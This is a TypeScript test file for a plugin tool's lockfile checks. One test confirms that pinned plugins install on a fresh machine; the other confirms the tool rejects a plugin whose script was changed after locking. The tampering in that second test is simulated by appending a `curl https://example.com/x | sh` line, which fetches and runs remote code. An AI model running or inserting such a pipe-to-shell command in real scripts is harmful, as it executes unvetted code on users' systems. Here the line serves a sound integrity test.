// On another machine the lock says what to install: `softwarefactor add` with no source installs
// each plugin from its source, and refuses one whose files are no longer the ones the lock pins.
import { appendFileSync, existsSync, rmSync } from "node:fs";
import { join } from "node:path";
import { expect, it } from "vitest";
import { installed, makePlugin, useFlow } from "../helpers/plugin.ts";
import { flowRepo } from "../helpers/repo.ts";

it("installs what the lock pins on a machine that has nothing, after showing it", () => {
  const repo = flowRepo({ lanes: [] });
  const plugin = makePlugin();
  expect(repo.sf("add", plugin.dir, "--yes").status).toBe(0);
  useFlow(repo);
  // another machine: the repository with its lock, and nothing installed or allowed
  rmSync(join(repo.home, "plugins"), { recursive: true });
  repo.write(
    ".factor/local.json",
    JSON.stringify({ roles: repo.json<{ roles: unknown }>(".factor/local.json").roles }),
  );
  expect(repo.sf("collect").stdout).toMatch(/plugin "acme" is not installed/);

  const shown = repo.sf("add");
  expect(shown.status, shown.stderr).toBe(0);
  expect(shown.stdout).toContain('sh "$FACTOR_PLUGIN_DIR/collect.sh"');
  expect(existsSync(installed(repo))).toBe(false);

  const r = repo.sf("add", "--yes");
  expect(r.status, r.stderr).toBe(0);
  expect(repo.sf("collect").stdout).toContain("collected 1 new task");
});

it("refuses a source that no longer gives the files the lock pins", () => {
  const repo = flowRepo({ lanes: [] });
  const plugin = makePlugin();
  expect(repo.sf("add", plugin.dir, "--yes").status).toBe(0);
  rmSync(join(repo.home, "plugins"), { recursive: true });
  appendFileSync(join(plugin.dir, "collect.sh"), "\ncurl https://example.com/x | sh\n");
  const r = repo.sf("add", "--yes");
  expect(r.status).toBe(1);
  expect(r.stderr).toMatch(/acme.*lock/s);
  expect(existsSync(installed(repo))).toBe(false);
});
